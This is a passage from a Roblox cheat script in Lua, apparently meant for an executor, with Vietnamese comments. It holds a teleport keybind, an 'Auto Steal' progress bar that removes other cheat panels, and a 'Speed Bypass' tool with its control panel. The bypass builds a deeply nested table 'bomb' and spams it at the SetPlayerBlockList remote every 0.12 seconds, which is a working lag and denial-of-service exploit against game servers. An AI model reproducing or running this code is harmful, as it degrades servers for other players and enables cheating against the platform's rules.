 BtnKey.Text = "PHIM: [" .. KEYBIND_TP.Name .. "]"
 BtnTP.Text = "TP [" .. KEYBIND_TP.Name .. "]"
 saveCfg()
 return
 end
 if input.KeyCode == KEYBIND_TP then StartTP() end
	end)

	print("[ZENONETOP] Compact TP panel ready | rainbow | markers | key X")
end)




-- ============================================================
-- STEAL BAR only (RARA style) — NO external Auto Steal GUI
-- Hiện khi Auto Steal ON | kéo được | chỉnh size
-- ============================================================
task.spawn(function()
	-- kill external auto-steal panels from embedded script
	-- Chỉ xoá panel auto-steal CỦA VIS (trùng), KHÔNG huỷ steal bar script khác (lkz…)
	local function killStealGuis()
 pcall(function()
 local parents = {PlayerGui}
 pcall(function() table.insert(parents, game:GetService("CoreGui")) end)
 pcall(function() if gethui then table.insert(parents, gethui()) end end)
 local own = {
 visautostealgui = true,
 visautosteal = true,
 aceautosteal = true,
 vis_auto_steal = true,
 }
 for _, parent in ipairs(parents) do
 for _, g in ipairs(parent:GetChildren()) do
 local n = (g.Name or ""):lower():gsub("%s+", "")
 -- giữ ZenonetopStealBarOnly + bar script khác
 if n == "visstealbaronly" then
 -- keep
 elseif own[n] or n:find("visautosteal", 1, true) then
 pcall(function() g:Destroy() end)
 end
 end
 end
 end)
	end
	killStealGuis()
	-- không loop destroy 0.5s (tránh đụng bar lkz) — chỉ clean 1 lần lúc load


	pcall(function()
 local o = PlayerGui:FindFirstChild("ZenonetopStealBarOnly")
 if o then o:Destroy() end
	end)

	local gui = Instance.new("ScreenGui")
	gui.Name = "ZenonetopStealBarOnly"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 200000 -- đè lên bar script khác, không xoá chúng
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.Parent = PlayerGui

	local scale = tonumber(St.stealBarScale) or 1
	local barW, barH = math.floor(280 * scale), math.floor(36 * scale)

	local frame = Instance.new("Frame")
	frame.Name = "StealBar"
	frame.Size = UDim2.new(0, barW, 0, barH)
	if type(St._stealBarPos) == "table" then
 frame.Position = UDim2.new(St._stealBarPos[1], St._stealBarPos[2], St._stealBarPos[3], St._stealBarPos[4])
	else
 frame.Position = UDim2.new(0.5, -barW/2, 0.12, 0)
	end
	frame.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
	frame.BackgroundTransparency = 0.15
	frame.BorderSizePixel = 0
	frame.Visible = true
	frame.Active = true
	frame.Parent = gui
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
	local stroke = Instance.new("UIStroke", frame)
	stroke.Color = Color3.fromRGB(70, 90, 140)
	stroke.Thickness = 1.2

	local title = Instance.new("TextLabel", frame)
	title.Name = "Title"
	title.Size = UDim2.new(0.42, 0, 1, 0)
	title.Position = UDim2.new(0, 10, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "STEALING..."
	title.TextColor3 = Color3.fromRGB(200, 220, 255)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 11
	title.TextXAlignment = Enum.TextXAlignment.Left

	local track = Instance.new("Frame", frame)
	track.Name = "Track"
	track.Size = UDim2.new(0.38, 0, 0, 8)
	track.Position = UDim2.new(0.40, 0, 0.5, -4)
	track.BackgroundColor3 = Color3.fromRGB(30, 35, 50)
	track.BorderSizePixel = 0
	Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

	local fill = Instance.new("Frame", track)
	fill.Name = "Fill"
	fill.Size = UDim2.new(0, 0, 1, 0)
	fill.BackgroundColor3 = Color3.fromRGB(100, 255, 160)
	fill.BorderSizePixel = 0
	Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
	local grad = Instance.new("UIGradient", fill)
	grad.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 220, 140)),
 ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 255, 210)),
	})

	local pctLbl = Instance.new("TextLabel", frame)
	pctLbl.Name = "Pct"
	pctLbl.Size = UDim2.new(0.18, -8, 1, 0)
	pctLbl.Position = UDim2.new(0.80, 0, 0, 0)
	pctLbl.BackgroundTransparency = 1
	pctLbl.Text = "0%"
	pctLbl.TextColor3 = Color3.fromRGB(180, 200, 230)
	pctLbl.Font = Enum.Font.GothamBold
	pctLbl.TextSize = 11
	pctLbl.TextXAlignment = Enum.TextXAlignment.Right

	-- FPS + Ping (Empire style)
	local metaLbl = Instance.new("TextLabel", frame)
	metaLbl.Name = "MetaFpsPing"
	metaLbl.Size = UDim2.new(0.55, 0, 0, 14)
	metaLbl.Position = UDim2.new(0, 10, 1, -16)
	metaLbl.BackgroundTransparency = 1
	metaLbl.Text = "FPS // -- PING // -- ms"
	metaLbl.TextColor3 = Color3.fromRGB(140, 145, 165)
	metaLbl.Font = Enum.Font.GothamBold
	metaLbl.TextSize = 10
	metaLbl.TextXAlignment = Enum.TextXAlignment.Left
	metaLbl.ZIndex = 5
	-- enlarge bar a bit for meta
	frame.Size = UDim2.new(0, barW, 0, math.max(barH, 48))
	task.spawn(function()
 local fps, frames, t0 = 60, 0, tick()
 local pingMs = "--"
 while gui and gui.Parent do
 frames = frames + 1
 if tick() - t0 >= 0.5 then
 fps = math.floor(frames / (tick() - t0) + 0.5)
 frames = 0
 t0 = tick()
 pcall(function()
 local p = LP:GetNetworkPing()
 if typeof(p) == "number" then
 pingMs = tostring(math.floor(p * 1000 + 0.5))
 end
 end)
 metaLbl.Text = string.format("FPS // %s PING // %s ms", tostring(fps), tostring(pingMs))
 end
 task.wait()
 end
	end)

	-- size +/- corner
	local szMinus = Instance.new("TextButton", frame)
	szMinus.Size = UDim2.new(0, 16, 0, 16)
	szMinus.Position = UDim2.new(1, -34, 0, 2)
	szMinus.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
	szMinus.Text = "−"
	szMinus.TextColor3 = Color3.new(1,1,1)
	szMinus.TextSize = 12
	szMinus.Font = Enum.Font.GothamBold
	szMinus.ZIndex = 3
	Instance.new("UICorner", szMinus).CornerRadius = UDim.new(1, 0)
	local szPlus = Instance.new("TextButton", frame)
	szPlus.Size = UDim2.new(0, 16, 0, 16)
	szPlus.Position = UDim2.new(1, -16, 0, 2)
	szPlus.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
	szPlus.Text = "+"
	szPlus.TextColor3 = Color3.new(1,1,1)
	szPlus.TextSize = 12
	szPlus.Font = Enum.Font.GothamBold
	szPlus.ZIndex = 3
	Instance.new("UICorner", szPlus).CornerRadius = UDim.new(1, 0)

	local function applyScale()
 scale = math.clamp(tonumber(St.stealBarScale) or 1, 0.5, 2.5)
 St.stealBarScale = scale
 barW = math.floor(280 * scale)
 barH = math.max(28, math.floor(42 * scale)) -- cao hơn một chút cho FPS line
 frame.Size = UDim2.new(0, barW, 0, barH)
 if title then title.TextSize = math.max(9, math.floor(11 * scale)) end
 if pctLbl then pctLbl.TextSize = math.max(9, math.floor(11 * scale)) end
 local meta = frame:FindFirstChild("MetaFpsPing")
 if meta then
 meta.TextSize = math.max(8, math.floor(10 * scale))
 meta.Size = UDim2.new(0.55, 0, 0, math.max(12, math.floor(14 * scale)))
 meta.Position = UDim2.new(0, 10, 1, -math.max(14, math.floor(16 * scale)))
 end
 local fill = frame:FindFirstChild("Fill") or frame:FindFirstChild("BarFill")
 -- progress row height scale if exists
 for _, ch in ipairs(frame:GetChildren()) do
 if ch:IsA("Frame") and (ch.Name == "BarBg" or ch.Name == "Progress" or ch.Name == "FillBg") then
 pcall(function()
 ch.Size = UDim2.new(ch.Size.X.Scale, ch.Size.X.Offset, 0, math.max(6, math.floor(10 * scale)))
 end)
 end
 end
 pcall(saveCfg)
	end
	szMinus.Active = true
	szPlus.Active = true
	szMinus.ZIndex = 20
	szPlus.ZIndex = 20
	local function onMinus()
 St.stealBarScale = math.clamp((tonumber(St.stealBarScale) or 1) - 0.1, 0.5, 2.5)
 applyScale()
	end
	local function onPlus()
 St.stealBarScale = math.clamp((tonumber(St.stealBarScale) or 1) + 0.1, 0.5, 2.5)
 applyScale()
	end
	szMinus.MouseButton1Click:Connect(onMinus)
	szMinus.MouseButton1Down:Connect(onMinus)
	szMinus.Activated:Connect(onMinus)
	szPlus.MouseButton1Click:Connect(onPlus)
	szPlus.MouseButton1Down:Connect(onPlus)
	szPlus.Activated:Connect(onPlus)
	-- apply saved scale on build
	pcall(applyScale)

	-- drag
	do
 local dragging, dragStart, startPos
 frame.InputBegan:Connect(function(input)
 if St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 dragStart = input.Position
 startPos = frame.Position
 input.Changed:Connect(function()
 if input.UserInputState == Enum.UserInputState.End then
 dragging = false
 St._stealBarPos = {frame.Position.X.Scale, frame.Position.X.Offset, frame.Position.Y.Scale, frame.Position.Y.Offset}
 saveCfg()
 end
 end)
 end
 end)
 UIS.InputChanged:Connect(function(input)
 if not dragging or St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 local d = input.Position - dragStart
 frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end)
	end

	-- progress loop — TẮT auto steal: giữ bar, chỉ về 0% (không ẩn bar)
	frame.Visible = true
	RS.RenderStepped:Connect(function()
 local on = St.autoSteal == true
 -- luôn hiện bar; OFF chỉ dừng logic + 0%
 frame.Visible = true
 local p = 0
 if on then
 p = math.clamp(tonumber(_G.AceStealBarProgress) or 0, 0, 1)
 else
 -- OFF: force 0
 _G.AceStealBarProgress = 0
 p = 0
 end
 fill.Size = UDim2.new(p, 0, 1, 0)
 local pct = math.floor(p * 100 + 0.5)
 pctLbl.Text = tostring(pct) .. "%"
 if not on then
 title.Text = "OFF"
 title.TextColor3 = Color3.fromRGB(160, 160, 170)
 pctLbl.TextColor3 = Color3.fromRGB(150, 150, 160)
 elseif p > 0.01 then
 title.Text = "STEALING..."
 title.TextColor3 = Color3.fromRGB(180, 220, 255)
 if pct >= 100 then
 pctLbl.TextColor3 = Color3.fromRGB(120, 255, 160)
 elseif pct >= 75 then
 pctLbl.TextColor3 = Color3.fromRGB(255, 230, 100)
 else
 pctLbl.TextColor3 = Color3.fromRGB(200, 210, 230)
 end
 else
 title.Text = "READY"
 title.TextColor3 = Color3.fromRGB(140, 255, 180)
 pctLbl.Text = "0%"
 pctLbl.TextColor3 = Color3.fromRGB(180, 200, 230)
 end
	end)

	-- override StealBar API to drive this bar
	_G.StealBar = {
 SetProgress = function(p)
 _G.AceStealBarProgress = math.clamp(tonumber(p) or 0, 0, 1)
 end,
 Reset = function()
 _G.AceStealBarProgress = 0
 end,
 SetState = function(state)
 if tostring(state) == "SUCCESS" then
 _G.AceStealBarProgress = 1
 end
 end,
	}

	
----------------------------------------------------------------
-- 
----------------------------------------------------------------
-- ACE SPEED BYPASS (full) — mini = ON/OFF EN + Lock | scale panels
----------------------------------------------------------------
-- ===== ZENONETOP FULL: Speed Bypass + Lagger V2 (replace All Gear old panels) =====
-- ZenonetopBypass — Speed Bypass (Noxa-style UI + keybind PC + minimize + bg)
-- ============================================================
task.spawn(function()
	local Players = game:GetService("Players")
	local LP = Players.LocalPlayer
	local UserInputService = game:GetService("UserInputService")
	local UIS = UserInputService
	local DEPTH = 296
	local SPAM_DELAY = 0.12
	local running = false
	local bomb = nil
	local spamThread = nil
	local ConfigFile = "ZenonetopBypass.json"
	-- Dùng full list BackgroundIDs của (1–50+)
	local BG_IDS = (BackgroundIDs and #BackgroundIDs > 0) and BackgroundIDs or {
 "89504528485163", "108697485255882", "71211662493854", "118953269416540", "106345334781345",
	}

	local function buildBomb(power)
 local maintable = {}
 local spammedtable = {{}}
 local z = spammedtable[1]
 for i = 1, DEPTH do
 local tableins = {}
 table.insert(z, tableins)
 z = tableins
 end
 local maxRep = math.floor((tonumber(power) or 97000) / (DEPTH + 2))
 maxRep = math.clamp(maxRep, 1, 50000)
 for i = 1, maxRep do
 table.insert(maintable, spammedtable)
 end
 return maintable
	end

	local function stopBypass()
 running = false
 if spamThread then pcall(function() task.cancel(spamThread) end) end
 bomb = nil
 spamThread = nil
	end

	local function startBypass(power)
 stopBypass()
 running = true
 bomb = buildBomb(power)
 spamThread = task.spawn(function()
 while running do
 if bomb then
 pcall(function()
 game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(bomb)
 end)
 end
 task.wait(SPAM_DELAY)
 end
 end)
	end

	_G.AceSetVisBypassEnabled = function(on, power)
 if on then startBypass(power or 97000) else stopBypass() end
	end
	_G.AceToggleVisBypass = function(power)
 if running then stopBypass() else startBypass(power or 97000) end
 return running
	end
	_G.AceVisBypassActive = function() return running end

	local savedPos = nil
	local savedBgIndex = 1
	local boundKey = Enum.KeyCode.V
	local waitingForKey = false
	local savedPanelOpen = false
	local savedMinimized = false
	local savedWantedActive = false
	pcall(function()
 if isfile and isfile(ConfigFile) then
 local data = game:GetService("HttpService"):JSONDecode(readfile(ConfigFile))
 if type(data.Pos) == "table" then savedPos = data.Pos end
 if data.Power then _G.AceVisBypassPower = tonumber(data.Power) or 97000 end
 if data.BgIndex then savedBgIndex = math.clamp(tonumber(data.BgIndex) or 1, 1, #BG_IDS) end
 if type(data.Keybind) == "string" and Enum.KeyCode[data.Keybind] then
 boundKey = Enum.KeyCode[data.Keybind]
 end
 -- Nhớ panel mở / minimize / bypass đang ON trước khi out
 savedPanelOpen = data.PanelOpen == true
 savedMinimized = data.Minimized == true
 savedWantedActive = data.WantedActive == true
 _G.AceVisBypassPanelOpen = savedPanelOpen
 end
	end)

	-- State snapshot (khai báo sớm để saveCfg luôn đọc được)
	local uiMinimized = false
	local uiWantedActive = false
	local uiActive = false

	local function saveCfg(mainFrame, power, extra)
 local panelIsOpen = (_G.AceVisBypassPanelOpen == true)
 pcall(function()
 if main and main.Visible then panelIsOpen = true end
 if mini and mini.Visible then panelIsOpen = true end
 end)
 local data = {
 Power = tonumber(power) or 97000,
 BgIndex = savedBgIndex,
 Keybind = boundKey and boundKey.Name or "V",
 PanelOpen = panelIsOpen,
 Minimized = uiMinimized == true,
 WantedActive = uiWantedActive == true or uiActive == true,
 }
 if type(extra) == "table" then
 for k, v in pairs(extra) do data[k] = v end
 end
 if mainFrame and mainFrame.Parent then
 local p = mainFrame.Position
 data.Pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 savedPos = data.Pos
 _G.AceVisBypassPanelPosition = data.Pos
 elseif type(_G.AceVisBypassPanelPosition) == "table" then
 data.Pos = _G.AceVisBypassPanelPosition
 elseif type(savedPos) == "table" then
 data.Pos = savedPos
 end
 savedPanelOpen = data.PanelOpen == true
 savedMinimized = data.Minimized == true
 savedWantedActive = data.WantedActive == true
 _G.AceVisBypassPanelOpen = savedPanelOpen
 _G.AceVisBypassMinimized = savedMinimized
 _G.AceVisBypassWantedActive = savedWantedActive
 _G.AceVisBypassPower = data.Power
 _G.AceSBPEnabled = savedWantedActive
 pcall(function()
 writefile(ConfigFile, game:GetService("HttpService"):JSONEncode(data))
 end)
 pcall(function() if saveAceConfig then saveAceConfig() end end)
	end

	local parent = (gethui and gethui()) or game:GetService("CoreGui")
	pcall(function()
 local old = parent:FindFirstChild("ZenonetopBypassGui")
 if old then old:Destroy() end
	end)

	local gui = Instance.new("ScreenGui")
	gui.Name = "ZenonetopBypassGui"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.Enabled = true
	gui.DisplayOrder = 250
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	pcall(function() gui.Parent = parent end)
	if not gui.Parent then
 local pg = (Players.LocalPlayer or game:GetService("Players").LocalPlayer):WaitForChild("PlayerGui")
 gui.Parent = pg
	end

	local function corner(obj, r)
 local c = Instance.new("UICorner")
 c.CornerRadius = UDim.new(0, r or 8)
 c.Parent = obj
 return c
	end
	local function stroke(obj, col, th, tr)
 local s = Instance.new("UIStroke")
 s.Color = col or Color3.fromRGB(41, 128, 255)
 s.Thickness = th or 1
 s.Transparency = tr or 0.3
 s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 s.Parent = obj
 return s
	end

	-- ===== FULL PANEL =====
	local W, H = 230, 320
	local main = Instance.new("Frame")
	main.Name = "MainFrame"
	main.Size = UDim2.fromOffset(W, H)
	if type(savedPos) == "table" then
 main.Position = UDim2.new(tonumber(savedPos.xs) or 0.5, tonumber(savedPos.xo) or -115, tonumber(savedPos.ys) or 0.35, tonumber(savedPos.yo) or 0)
	else
 main.Position = UDim2.new(0.5, -115, 0.35, 0)
	end
	main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	main.BorderSizePixel = 0
	main.Active = true
	main.Visible = false
	main.ClipsDescendants = true
	main.Parent = gui
	corner(main, 13)
	stroke(main, Color3.fromRGB(39, 39, 39), 1.3)

	-- Background image (Noxa-style)
	local bgImg = Instance.new("ImageLabel", main)
	bgImg.Name = "BgImage"
	bgImg.Size = UDim2.new(1, 0, 1, 0)
	bgImg.BackgroundTransparency = 1
	bgImg.Image = "rbxassetid://" .. (BG_IDS[savedBgIndex] or BG_IDS[1])
	bgImg.ScaleType = Enum.ScaleType.Crop
	bgImg.ImageTransparency = 0.35
	bgImg.ZIndex = 0
	corner(bgImg, 13)

	local header = Instance.new("Frame", main)
	header.Size = UDim2.new(1, -6, 0, 31)
	header.Position = UDim2.fromOffset(3, 3)
	header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	header.BackgroundTransparency = 0.15
	header.BorderSizePixel = 0
	header.ZIndex = 4
	corner(header, 10)

	local titleNoxa = Instance.new("TextLabel", header)
	titleNoxa.Size = UDim2.fromOffset(36, 31)
	titleNoxa.Position = UDim2.fromOffset(12, 0)
	titleNoxa.BackgroundTransparency = 1
	titleNoxa.Text = "VIS"
	titleNoxa.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleNoxa.Font = Enum.Font.GothamBold
	titleNoxa.TextSize = 12
	titleNoxa.TextXAlignment = Enum.TextXAlignment.Left
	titleNoxa.ZIndex = 6

	local titleBypass = Instance.new("TextLabel", header)
	titleBypass.Size = UDim2.fromOffset(70, 31)
	titleBypass.Position = UDim2.fromOffset(44, 0)
	titleBypass.BackgroundTransparency = 1
	titleBypass.Text = "BYPASS"
	titleBypass.TextColor3 = Color3.fromRGB(41, 128, 255)
	titleBypass.Font = Enum.Font.GothamBold
	titleBypass.TextSize = 12
	titleBypass.TextXAlignment = Enum.TextXAlignment.Left
	titleBypass.ZIndex = 6

	-- LOCK ngay cạnh nút - (giống Ping Lagger: LOCK cạnh ⚙)
	local lockBtn = Instance.new("TextButton", header)
	lockBtn.Size = UDim2.fromOffset(48, 22)
	lockBtn.Position = UDim2.new(1, -88, 0.5, -11)
	lockBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
	lockBtn.BorderSizePixel = 0
	lockBtn.Text = "LOCK"
	lockBtn.TextColor3 = Color3.fromRGB(180, 180, 190)
	lockBtn.Font = Enum.Font.GothamBold
	lockBtn.TextSize = 9
	lockBtn.ZIndex = 8
	lockBtn.AutoButtonColor = false
	corner(lockBtn, 6)
	stroke(lockBtn, Color3.fromRGB(48, 48, 48), 1)

	local hideBtn = Instance.new("TextButton", header)
	hideBtn.Size = UDim2.fromOffset(30, 22)
	hideBtn.Position = UDim2.new(1, -36, 0.5, -11)
	hideBtn.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
	hideBtn.BorderSizePixel = 0
	hideBtn.Text = "-"
	hideBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	hideBtn.Font = Enum.Font.GothamBold
	hideBtn.TextSize = 16
	hideBtn.ZIndex = 7
	hideBtn.AutoButtonColor = false
	corner(hideBtn, 7)
	stroke(hideBtn, Color3.fromRGB(48, 48, 48), 1)

	-- Keybind row
	local keyRow = Instance.new("Frame", main)
	keyRow.Size = UDim2.new(1, -18, 0, 28)
	keyRow.Position = UDim2.fromOffset(9, 42)
	keyRow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	keyRow.BackgroundTransparency = 0.2
	keyRow.BorderSizePixel = 0
	keyRow.ZIndex = 4
	corner(keyRow, 7)
	stroke(keyRow, Color3.fromRGB(44, 44, 44), 1)

	local kbLbl = Instance.new("TextLabel", keyRow)
	kbLbl.Size = UDim2.fromOffset(28, 28)
	kbLbl.Position = UDim2.fromOffset(10, 0)
	kbLbl.BackgroundTransparency = 1
	kbLbl.Text = "KB:"
	kbLbl.TextColor3 = Color3.fromRGB(125, 125, 125)
	kbLbl.Font = Enum.Font.GothamBold
	kbLbl.TextSize = 9
	kbLbl.ZIndex = 5

	local kbButton = Instance.new("TextButton", keyRow)
	kbButton.Size = UDim2.fromOffset(60, 22)
	kbButton.Position = UDim2.fromOffset(40, 3)
	kbButton.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	kbButton.BorderSizePixel = 0
	kbButton.Text = boundKey.Name
	kbButton.TextColor3 = Color3.fromRGB(248, 248, 248)
	kbButton.Font = Enum.Font.GothamBold
	kbButton.TextSize = 10
	kbButton.ZIndex = 6
	corner(kbButton, 5)
	stroke(kbButton, Color3.fromRGB(52, 52, 52), 1)

	local bgLbl = Instance.new("TextLabel", keyRow)
	bgLbl.Size = UDim2.fromOffset(28, 28)
	bgLbl.Position = UDim2.new(0.5, 8, 0, 0)
	bgLbl.BackgroundTransparency = 1
	bgLbl.Text = "BG:"
	bgLbl.TextColor3 = Color3.fromRGB(125, 125, 125)
	bgLbl.Font = Enum.Font.GothamBold
	bgLbl.TextSize = 9
	bgLbl.ZIndex = 5

	local bgButton = Instance.new("TextButton", keyRow)
	bgButton.Size = UDim2.fromOffset(50, 22)
	bgButton.Position = UDim2.new(1, -56, 0, 3)
	bgButton.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	bgButton.BorderSizePixel = 0
	bgButton.Text = "#" .. tostring(savedBgIndex)
	bgButton.TextColor3 = Color3.fromRGB(180, 210, 255)
	bgButton.Font = Enum.Font.GothamBold
	bgButton.TextSize = 10
	bgButton.ZIndex = 6
	corner(bgButton, 5)
	stroke(bgButton, Color3.fromRGB(52, 52, 52), 1)

	-- Status ring area
	local ringInner = Instance.new("Frame", main)
	ringInner.Size = UDim2.new(1, -20, 0, 110)
	ringInner.Position = UDim2.fromOffset(10, 80)
	ringInner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	ringInner.BackgroundTransparency = 0.25
	ringInner.BorderSizePixel = 0
	ringInner.ZIndex = 4
	corner(ringInner, 12)
	stroke(ringInner, Color3.fromRGB(40, 40, 48), 1)

	local statusLabel = Instance.new("TextLabel", ringInner)
	statusLabel.Size = UDim2.new(1, 0, 0, 14)
	statusLabel.Position = UDim2.fromOffset(0, 8)
	statusLabel.BackgroundTransparency = 1
	statusLabel.Text = "OFFLINE"
	statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	statusLabel.Font = Enum.Font.GothamBold
	statusLabel.TextSize = 10
	statusLabel.ZIndex = 5

	local powerText = Instance.new("TextLabel", ringInner)
	powerText.Size = UDim2.new(1, 0, 0, 36)
	powerText.Position = UDim2.fromOffset(0, 24)
	powerText.BackgroundTransparency = 1
	powerText.Text = "97K"
	powerText.TextColor3 = Color3.fromRGB(255, 255, 255)
	powerText.Font = Enum.Font.GothamBlack
	powerText.TextSize = 28
	powerText.ZIndex = 5

	local timerText = Instance.new("TextLabel", ringInner)
	timerText.Size = UDim2.new(1, 0, 0, 12)
	timerText.Position = UDim2.fromOffset(0, 60)
	timerText.BackgroundTransparency = 1
	timerText.Text = "00:00"
	timerText.TextColor3 = Color3.fromRGB(106, 106, 106)
	timerText.Font = Enum.Font.Gotham
	timerText.TextSize = 10
	timerText.ZIndex = 5

	local powerBox = Instance.new("TextBox", ringInner)
	powerBox.Size = UDim2.new(1, -14, 0, 22)
	powerBox.Position = UDim2.new(0, 7, 1, -28)
	powerBox.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
	powerBox.BorderSizePixel = 0
	powerBox.ClearTextOnFocus = false
	powerBox.Text = tostring(_G.AceVisBypassPower or 97000)
	powerBox.TextColor3 = Color3.fromRGB(205, 205, 205)
	powerBox.Font = Enum.Font.GothamBold
	powerBox.TextSize = 11
	powerBox.ZIndex = 6
	corner(powerBox, 6)

	local activateButton = Instance.new("TextButton", main)
	activateButton.Size = UDim2.new(1, -18, 0, 40)
	activateButton.Position = UDim2.fromOffset(9, 200)
	activateButton.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
	activateButton.BorderSizePixel = 0
	activateButton.Text = "ACTIVATE"
	activateButton.TextColor3 = Color3.fromRGB(41, 128, 255)
	activateButton.Font = Enum.Font.GothamBold
	activateButton.TextSize = 12
	activateButton.AutoButtonColor = false
	activateButton.ZIndex = 5
	corner(activateButton, 10)

	local closeBtn = Instance.new("TextButton", main)
	closeBtn.Size = UDim2.new(1, -18, 0, 28)
	closeBtn.Position = UDim2.fromOffset(9, 250)
	closeBtn.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
	closeBtn.BorderSizePixel = 0
	closeBtn.Text = "CLOSE"
	closeBtn.TextColor3 = Color3.fromRGB(255, 180, 180)
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 11
	closeBtn.ZIndex = 5
	corner(closeBtn, 8)

	local discLbl = Instance.new("TextLabel", main)
	discLbl.Size = UDim2.new(1, 0, 0, 22)
	discLbl.Position = UDim2.fromOffset(0, 288)
	discLbl.BackgroundTransparency = 1
	discLbl.Text = "ZENONETOP · Speed Bypass"
	discLbl.TextColor3 = Color3.fromRGB(160, 160, 170)
	discLbl.Font = Enum.Font.GothamBold
	discLbl.TextSize = 11
	discLbl.ZIndex = 5

	-- ===== MINI PANEL (nút -) =====
	local mini = Instance.new("Frame", gui)
	mini.Name = "MiniFrame"
	mini.Size = UDim2.fromOffset(230, 92)
	mini.Position = main.Position
	mini.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	mini.BorderSizePixel = 0
	mini.Active = true
	mini.Visible = false
	mini.ClipsDescendants = true
	mini.ZIndex = 40
	corner(mini, 13)
	stroke(mini, Color3.fromRGB(39, 39, 39), 1.3)

	local miniBg = Instance.new("ImageLabel", mini)
	miniBg.Size = UDim2.new(1, 0, 1, 0)
	miniBg.BackgroundTransparency = 1
	miniBg.Image = bgImg.Image
	miniBg.ScaleType = Enum.ScaleType.Crop
	miniBg.ImageTransparency = 0.4
	miniBg.ZIndex = 40
	corner(miniBg, 13)

	local miniHeader = Instance.new("Frame", mini)
	miniHeader.Size = UDim2.new(1, -6, 0, 31)
	miniHeader.Position = UDim2.fromOffset(3, 3)
	miniHeader.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	miniHeader.BackgroundTransparency = 0.15
	miniHeader.BorderSizePixel = 0
	miniHeader.ZIndex = 42
	corner(miniHeader, 10)

	local miniTitle1 = Instance.new("TextLabel", miniHeader)
	miniTitle1.Size = UDim2.fromOffset(36, 31)
	miniTitle1.Position = UDim2.fromOffset(12, 0)
	miniTitle1.BackgroundTransparency = 1
	miniTitle1.Text = "VIS"
	miniTitle1.TextColor3 = Color3.fromRGB(255, 255, 255)
	miniTitle1.Font = Enum.Font.GothamBold
	miniTitle1.TextSize = 11
	miniTitle1.ZIndex = 44

	local miniTitle2 = Instance.new("TextLabel", miniHeader)
	miniTitle2.Size = UDim2.fromOffset(70, 31)
	miniTitle2.Position = UDim2.fromOffset(44, 0)
	miniTitle2.BackgroundTransparency = 1
	miniTitle2.Text = "BYPASS"
	miniTitle2.TextColor3 = Color3.fromRGB(41, 128, 255)
	miniTitle2.Font = Enum.Font.GothamBold
	miniTitle2.TextSize = 11
	miniTitle2.ZIndex = 44

	-- LOCK cạnh nút + (giống full panel)
	local miniLock = Instance.new("TextButton", miniHeader)
	miniLock.Size = UDim2.fromOffset(48, 22)
	miniLock.Position = UDim2.new(1, -88, 0.5, -11)
	miniLock.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
	miniLock.BorderSizePixel = 0
	miniLock.Text = "LOCK"
	miniLock.TextColor3 = Color3.fromRGB(180, 180, 190)
	miniLock.Font = Enum.Font.GothamBold
	miniLock.TextSize = 9
	miniLock.ZIndex = 46
	miniLock.AutoButtonColor = false
	corner(miniLock, 6)
	stroke(miniLock, Color3.fromRGB(48, 48, 48), 1)

	local unhideBtn = Instance.new("TextButton", miniHeader)
	unhideBtn.Size = UDim2.fromOffset(30, 22)
	unhideBtn.Position = UDim2.new(1, -36, 0.5, -11)
	unhideBtn.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
	unhideBtn.BorderSizePixel = 0
	unhideBtn.Text = "+"
	unhideBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	unhideBtn.Font = Enum.Font.GothamBold
	unhideBtn.TextSize = 14
	unhideBtn.ZIndex = 45
	unhideBtn.AutoButtonColor = false
	corner(unhideBtn, 7)
	stroke(unhideBtn, Color3.fromRGB(48, 48, 48), 1)

	local miniActivate = Instance.new("TextButton", mini)
	miniActivate.Size = UDim2.new(1, -18, 0, 36)
	miniActivate.Position = UDim2.fromOffset(9, 42)
	miniActivate.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
	miniActivate.BorderSizePixel = 0
	miniActivate.Text = "ACTIVATE"
	miniActivate.TextColor3 = Color3.fromRGB(41, 128, 255)
	miniActivate.Font = Enum.Font.GothamBold
	miniActivate.TextSize = 11
	miniActivate.AutoButtonColor = false
	miniActivate.ZIndex = 42
	corner(miniActivate, 10)

	-- ===== STATE =====
	local active = false
	local locked = false
	local forceSetLocked
	local minimized = false
	local startedAt = 0
	local userWantedActive = false

	local function formatPower(n)
